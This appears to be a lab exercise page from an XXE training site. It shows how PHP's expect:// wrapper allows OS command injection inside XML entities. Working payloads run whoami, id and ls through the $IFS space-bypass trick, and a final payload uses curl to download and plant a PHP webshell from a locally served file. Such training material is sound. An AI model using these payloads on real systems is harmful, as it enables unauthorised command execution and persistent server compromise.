---
title: "Command Injection"
weight: 3
---

{{% notice note %}}
Make sure you are on the PHP site (`/php/`) for these exercises.
{{% /notice %}}

If PHP allows the use of the `expect` protocol we may be able to run commands directly against the operating system.

In this first example we are going to run the `whoami` command and include the results in the XML document:

```xml
<!DOCTYPE root [
  <!ENTITY cmd SYSTEM "expect://whoami">
]>

<root>
  <name>XXE</name>
  <tel>(555) 555-1734</tel>
  <email>&cmd;</email>
  <password>pass</password>
</root>
```

As shown below we can see the results of the command:

![](/static/img/php_whoami_results.png)

One more example. Lets get the groups and IDs the `www-data` user is a part of:

```xml
<!DOCTYPE root [
  <!ENTITY cmd SYSTEM "expect://id">
]>

<root>
  <name>XXE</name>
  <tel>(555) 555-1734</tel>
  <email>&cmd;</email>
  <password>pass</password>
</root>
```

It looks like we are part of the `www-data` and `vagrant` groups.

![](/static/img/php_id_results.png)

One issue with command injection is that there are some characters that will mess things up. The most prominant is the space. If we try to submit a command like `ls /etc/` it will not work. We can overcome this by using the `$IFS`. `$IFS` tells bash how to separate words and by default it is set as a space. Using this we can then issue the command `ls$IFS/etc/` and expect to get the results back:

```xml
<!DOCTYPE root [
  <!ENTITY cmd SYSTEM "expect://ls$IFS/etc">
]>

<root>
  <name>XXE</name>
  <tel>(555) 555-1734</tel>
  <email>&cmd;</email>
  <password>pass</password>
</root>
```

![](/static/img/php_ifs_results.png)

## Webshell

We can use these techniques to create a webshell. First run a python webserver in the `/home/vagrant/test_files` directory. Inside that directory you will find the `simple_php_webshell.php` file which will be our target.

```bash
cd /home/vagrant/test_files
python3 -m http.server 5000
```

What we are going to do is use expect to call curl and download the webshell. Here is our payload:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY file SYSTEM "expect://curl$IFS-O$IFS'127.0.0.1:5000/simple_php_webshell.php'">
]>
<root>
  <name>Joe</name>
  <tel>ufgh</tel>
  <email>START_&file;_END</email>
  <password>kjh</password>
</root>
```

If everything worked you should now be able to visit [http://localhost:8085/php/simple_php_webshell.php](http://localhost:8085/php/simple_php_webshell.php).

![](/static/img/php_webshell.png)
